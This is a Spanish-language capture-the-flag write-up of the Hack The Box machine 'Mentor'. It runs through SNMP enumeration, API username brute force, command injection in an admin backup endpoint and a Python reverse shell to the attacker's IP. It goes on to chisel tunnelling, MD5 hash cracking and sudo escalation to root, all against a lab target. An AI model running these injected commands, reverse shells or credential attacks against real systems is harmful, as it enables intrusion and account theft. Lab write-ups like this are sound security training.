---
layout: post
title: Mentor
date: 2023-04-12
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Mentor-htb/Mentor.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.193 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 16:18 GMT
Nmap scan report for 10.10.11.193
Host is up (0.12s latency).
Not shown: 65506 closed tcp ports (reset), 27 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.193 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 16:21 GMT
Nmap scan report for 10.10.11.193
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
```

Agrego el dominio ```mentorquotes.htb``` al ```/etc/hosts```

La página principal se ve así:

<img src="/writeups/assets/img/Mentor-htb/1.png" alt="">

Encuentro un subdominio

```null
wfuzz -c --hw=26 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.mentorquotes.htb" http://mentorquotes.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"  
```

Lo agrego al ```/etc/hosts```

Al tramitar una petición por GET a la raíz recibo una respuesta en JSON

```null
curl -s -X GET http://api.mentorquotes.htb/ | jq
{
  "detail": "Not Found"
}
```

Aplico fuzzing para descubrir rutas

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api.mentorquotes.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api.mentorquotes.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000076:   200        30 L     62 W       969 Ch      "docs"                                                                                                                                          
000000188:   307        0 L      0 W        0 Ch        "users"                                                                                                                                         
000000245:   307        0 L      0 W        0 Ch        "admin"                                                                                                                                         
000000673:   307        0 L      0 W        0 Ch        "quotes"                                                                                                                                        
000010372:   200        27 L     52 W       772 Ch      "redoc"                                                                                                                                         
000095510:   403        9 L      28 W       285 Ch      "server-status"
```

En ```/docs``` puedo obtener una lista de ayuda de la API

<img src="/writeups/assets/img/Mentor-htb/2.png" alt="">

Puedo registrarme

```null
curl -s -X POST 'http://api.mentorquotes.htb/auth/signup' -H 'Content-Type: application/json' -d '{"email": "rubbx@rubbx.com","username": "rubbx","password": "rubbx123$!"}' | jq
{
  "id": 4,
  "email": "rubbx@rubbx.com",
  "username": "rubbx"
}
```

Al loggearme obtengo un JWT

```null
curl -s -X POST 'http://api.mentorquotes.htb/auth/login' -H 'Content-Type: application/json' -d '{"email": "rubbx@rubbx.com","username": "rubbx","password": "rubbx123$!"}' | jq
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InJ1YmJ4IiwiZW1haWwiOiJydWJieEBydWJieC5jb20ifQ.SlgNb_lHgXQ1DmlN2pEBQR8M7w5h_z4qHaR-4zG5s5k"
```

Está compuesto por lo siguiente:

<img src="/writeups/assets/img/Mentor-htb/3.png" alt="">

No tengo permisos para listar el resto de usuarios

```null
curl -s -X GET http://api.mentorquotes.htb/users/ -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InJ1YmJ4IiwiZW1haWwiOiJydWJieEBydWJieC5jb20ifQ.SlgNb_lHgXQ1DmlN2pEBQR8M7w5h_z4qHaR-4zG5s5k" | jq
{
  "detail": "Only admin users can access this resource"
}
```

Hago un escaneo de puertos pero por UDP

```null
nmap -p- --open --min-rate 5000 -n -Pn -sU 10.10.11.193 -oG openportsudp
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 17:04 GMT
Warning: 10.10.11.193 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.193
Host is up (0.28s latency).
Not shown: 65378 open|filtered udp ports (no-response), 156 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 151.86 seconds
```

Está abierto el SNMP. Listo los procesos de la máquina por ese puerto. Primeramente necesito conocer la community string

```null
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.193
Scanning 1 hosts, 120 communities
10.10.11.193 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
```

```null
snmpbulkwalk -v2c -c public 10.10.11.193 > snmpscan
```

Se filtra un usuario

```null
cat snmpscan | grep htb
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
```

Utilzo [snmpbrute.py](https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py) para aplicar fuerza bruta

```null
python3 snmpbrute.py -t 10.10.11.193
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

10.10.11.193 : 161 	Version (v2c):	internal
10.10.11.193 : 161 	Version (v1):	public
10.10.11.193 : 161 	Version (v2c):	public
10.10.11.193 : 161 	Version (v1):	public
10.10.11.193 : 161 	Version (v2c):	public
Waiting for late packets (CTRL+C to stop)

Trying identified strings for READ-WRITE ...

Identified Community strings
	0) 10.10.11.193    internal (v2c)(RO)
	1) 10.10.11.193    public (v1)(RO)
	2) 10.10.11.193    public (v2c)(RO)
	3) 10.10.11.193    public (v1)(RO)
	4) 10.10.11.193    public (v2c)(RO)
```

La community string ```internal``` es válida. Aplico un escaneo de nuevo

```null
snmpbulkwalk -v2c -c internal 10.10.11.193 > snmpscan
```

Listo los procesos existentes

```null
cat snmpscan | grep 'HOST-RESOURCES-MIB::hrSWRunName' | grep -oP '".*?"'
"systemd"
"kthreadd"
"rcu_gp"
"rcu_par_gp"
"netns"
"kworker/0:0H-events_highpri"
"kworker/0:1H-events_highpri"
"mm_percpu_wq"
"rcu_tasks_rude_"
"rcu_tasks_trace"
"ksoftirqd/0"
"rcu_sched"
"migration/0"
"idle_inject/0"
"cpuhp/0"
"cpuhp/1"
"idle_inject/1"
"migration/1"
"ksoftirqd/1"
"kworker/1:0H-events_highpri"
"kdevtmpfs"
"inet_frag_wq"
"kauditd"
"khungtaskd"
"oom_reaper"
"writeback"
"kcompactd0"
"ksmd"
"khugepaged"
"kintegrityd"
"kblockd"
"blkcg_punt_bio"
"tpm_dev_wq"
"ata_sff"
"md"
"edac-poller"
"devfreq_wq"
"watchdogd"
"kswapd0"
"ecryptfs-kthrea"
"kthrotld"
"irq/24-pciehp"
"irq/25-pciehp"
"irq/26-pciehp"
"irq/27-pciehp"
"irq/28-pciehp"
"irq/29-pciehp"
"irq/30-pciehp"
"irq/31-pciehp"
"irq/32-pciehp"
"irq/33-pciehp"
"irq/34-pciehp"
"irq/35-pciehp"
"irq/36-pciehp"
"irq/37-pciehp"
"irq/38-pciehp"
"irq/39-pciehp"
"irq/40-pciehp"
"irq/41-pciehp"
"irq/42-pciehp"
"irq/43-pciehp"
"irq/44-pciehp"
"irq/45-pciehp"
"irq/46-pciehp"
"irq/47-pciehp"
"irq/48-pciehp"
"irq/49-pciehp"
"irq/50-pciehp"
"irq/51-pciehp"
"irq/52-pciehp"
"irq/53-pciehp"
"irq/54-pciehp"
"irq/55-pciehp"
"acpi_thermal_pm"
"scsi_eh_0"
"scsi_tmf_0"
"scsi_eh_1"
"scsi_tmf_1"
"vfio-irqfd-clea"
"kworker/1:1H-events_highpri"
"mld"
"ipv6_addrconf"
"kstrp"
"zswap-shrink"
"kworker/u257:0"
"charger_manager"
"scsi_eh_2"
"scsi_tmf_2"
"scsi_eh_3"
"scsi_tmf_3"
"scsi_eh_4"
"mpt_poll_0"
"scsi_tmf_4"
"mpt/0"
"scsi_eh_5"
"scsi_tmf_5"
"scsi_eh_6"
"scsi_tmf_6"
"scsi_eh_7"
"scsi_tmf_7"
"scsi_eh_8"
"scsi_tmf_8"
"scsi_eh_9"
"cryptd"
"scsi_tmf_9"
"scsi_eh_10"
"scsi_tmf_10"
"scsi_eh_11"
"scsi_tmf_11"
"scsi_eh_12"
"scsi_tmf_12"
"scsi_eh_13"
"scsi_tmf_13"
"scsi_eh_14"
"scsi_tmf_14"
"scsi_eh_15"
"scsi_tmf_15"
"scsi_eh_16"
"scsi_tmf_16"
"scsi_eh_17"
"scsi_tmf_17"
"scsi_eh_18"
"scsi_tmf_18"
"scsi_eh_19"
"scsi_tmf_19"
"scsi_eh_20"
"ttm_swap"
"scsi_tmf_20"
"scsi_eh_21"
"irq/16-vmwgfx"
"scsi_tmf_21"
"scsi_eh_22"
"scsi_tmf_22"
"scsi_eh_23"
"scsi_tmf_23"
"scsi_eh_24"
"scsi_tmf_24"
"scsi_eh_25"
"scsi_tmf_25"
"scsi_eh_26"
"scsi_tmf_26"
"scsi_eh_27"
"scsi_tmf_27"
"scsi_eh_28"
"scsi_tmf_28"
"scsi_eh_29"
"scsi_tmf_29"
"scsi_eh_30"
"card0-crtc0"
"scsi_tmf_30"
"card0-crtc1"
"card0-crtc2"
"scsi_eh_31"
"card0-crtc3"
"scsi_tmf_31"
"card0-crtc4"
"card0-crtc5"
"card0-crtc6"
"card0-crtc7"
"kworker/u256:25-flush-253:0"
"kworker/u256:27-events_power_efficient"
"scsi_eh_32"
"scsi_tmf_32"
"kdmflush"
"kdmflush"
"raid5wq"
"jbd2/dm-0-8"
"ext4-rsv-conver"
"systemd-journal"
"kaluad"
"kmpath_rdacd"
"kmpathd"
"kmpath_handlerd"
"multipathd"
"systemd-udevd"
"systemd-network"
"jbd2/sda2-8"
"ext4-rsv-conver"
"systemd-resolve"
"systemd-timesyn"
"VGAuthService"
"vmtoolsd"
"dhclient"
"dbus-daemon"
"irqbalance"
"networkd-dispat"
"polkitd"
"rsyslogd"
"snapd"
"systemd-logind"
"udisksd"
"ModemManager"
"cron"
"snmpd"
"containerd"
"agetty"
"sshd"
"apache2"
"apache2"
"apache2"
"dockerd"
"login.sh"
"docker-proxy"
"containerd-shim"
"postgres"
"docker-proxy"
"containerd-shim"
"python3"
"postgres"
"postgres"
"postgres"
"postgres"
"postgres"
"postgres"
"docker-proxy"
"containerd-shim"
"python"
"python3"
"python3"
"postgres"
"postgres"
"login.py"
"kworker/0:0-events"
"kworker/1:1-events"
"kworker/u256:1-flush-253:0"
"kworker/0:1-events"
"kworker/1:2-cgroup_destroy"
"kworker/0:2-events"
"kworker/1:0-mpt_poll_0"
"kworker/u256:0-events_power_efficient"
```

Se está ejecutando un script de bash

```null
cat snmpscan | grep 'HOST-RESOURCES-MIB::hrSWRunName' | grep -oP '".*?"' | tr -d '"' | grep ".sh$"
kdmflush
kdmflush
login.sh
```

Y también en python

```null
cat snmpscan | grep 'HOST-RESOURCES-MIB::hrSWRunName' | grep -oP '".*?"' | tr -d '"' | grep ".py$"
login.py
```

Aparecen credenciales en texto claro

```null
cat snmpscan | grep login.py
HOST-RESOURCES-MIB::hrSWRunName.2120 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunParameters.2120 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

Aplico fuerza bruta de usuarios con esa contraseña

```null
wfuzz -c --hc=403,422 -t 200 -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -H 'Content-Type: application/json' -d '{"email": "FUZZ@mentorquotes.htb","username": "FUZZ","password": "kj23sadkj123as0-d213"}' http://api.mentorquotes.htb/auth/login
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api.mentorquotes.htb/auth/login
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000004506:   200        0 L      1 W        154 Ch      "james - james" 
```

Obtengo su JWT

```null
curl -s -X POST 'http://api.mentorquotes.htb/auth/login' -H 'Content-Type: application/json' -d '{"email": "james@mentorquotes.htb","username": "james","password": "kj23sadkj123as0-d213"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

Es un usuario Administrador. Tramito una petición por GET a ```/admin``` y obtengo dos rutas

```null
curl -s -X GET http://api.mentorquotes.htb/admin/ -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
```

Lo mismo pero por POST a ```/admin/backup```

```null
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" | jq
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Me faltan los campos ```body``` y ```path```. Introduzco cualquier cosa y devuelve un OK

```null
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"body":"test","path":"test"}' | jq
{
  "INFO": "Done!"
}
```

Pruebo a inyectar un comando para enviarme una traza ICMP

```null
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0" -H "Content-Type: application/json" -d '{"body":"test","path":"test; ping -c 1 10.10.16.8;"}' | jq
```

La recibo en ```tcpdump```. Es un contenedor con IP ```10.10.16.8```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:22:56.764564 IP 10.10.11.193 > 10.10.16.8: ICMP echo request, id 6912, seq 0, length 64
18:22:56.764649 IP 10.10.16.8 > 10.10.11.193: ICMP echo reply, id 6912, seq 0, length 64
```

Me envío una reverse shell

```null
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: curl/7.88.1
Accept: */*
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Content-Type: application/json
Content-Length: 52
Connection: close

{"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.8\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}
```

Recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.193] 45396
/app # python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/local/lib/python3.6/pty.py", line 156, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/local/lib/python3.6/os.py", line 542, in execlp
    execvp(file, args)
  File "/usr/local/lib/python3.6/os.py", line 559, in execvp
    _execvpe(file, args)
  File "/usr/local/lib/python3.6/os.py", line 583, in _execvpe
    exec_func(file, *argrest)
FileNotFoundError: [Errno 2] No such file or directory
/app # ^[[17;8R^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
/app # export TERM=term
/app # export SHELL=bash
/app # stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
/ # ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 02:42:AC:16:00:03  
          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1219 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1168 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:113928 (111.2 KiB)  TX bytes:107395 (104.8 KiB)
```

Puedo ver la primera flag

```null
/home # cd svc
/home/svc # ls
user.txt
/home/svc # whoami
root
/home/svc # cat user.txt
d62ac17616f32b331c346f8a379f1e16
```

Dentro de ```app``` se puede ver un archivo de configuración de la conexión a la base de datos

```null
/app/app # cat db.py 
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

Se está utilizando las credenciales ```postgresql:postgresql```. Transfiero el ```chisel``` a la máquina víctima para hacer ```Remote Port Forwarding```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

En la máquina víctima como cliente

```null
/tmp # ./chisel client 10.10.16.8:1234 R:socks &>/dev/null &
```

Me conecto al postgres

```null
proxychains psql -h 172.22.0.1 -p 5432 -U postgres
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Password for user postgres: 
psql (15.3 (Debian 15.3-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# 
```

Enumero las bases de datos

```null
postgres-# \list
                                                   List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |   Access privileges   
-----------------+----------+----------+------------+------------+------------+-----------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
(4 rows)
```

Me conecto a ```mentorquotes_db```

```null
postgres-# \connect mentorquotes_db 
psql (15.3 (Debian 15.3-0+deb12u1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
```

Listo las tablas

```null
mentorquotes_db-# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)
```

Me quedo con todos los valores de ```users```

```null
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

Crackeo el hash de ```svc``` con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
123meunomeeivani (?)     
1g 0:00:00:00 DONE (2023-06-09 09:13) 1.886g/s 25140Kp/s 25140Kc/s 25140KC/s 123migLOVE..123mandi8995
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Me conecto como ```svc``` a la máquina víctima

```null
ssh svc@10.10.11.193
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jun  9 09:15:14 AM UTC 2023

  System load:                      0.02294921875
  Usage of /:                       65.1% of 8.09GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        244
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5626

  => There are 2 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jun  9 09:15:15 2023 from 10.10.16.8
svc@mentor:~$ 
```

En el archivo de configuración del ```snmp``` se leakea una contraseña

```null
svc@mentor:/$ cat /etc/snmp/snmpd.conf | grep -v "^#" | grep .
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>
sysServices    72
master  agentx
agentAddress udp:161,udp6:[::1]:161
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
includeDir /etc/snmp/snmpd.conf.d
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
com2sec AllUser default internal
group AllGroup v2c AllUser
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```

Gano acceso como james

```null
svc@mentor:/$ su james
Password: 
james@mentor:/$ 
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
james@mentor:/$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Ejecuto una ```sh``` como ```root```. Puedo ver la segunda flag

```null
james@mentor:/$ sudo sh
# whoami
root
# cat /root/root.txt
88535124b409f63bfcb3be652590e694
```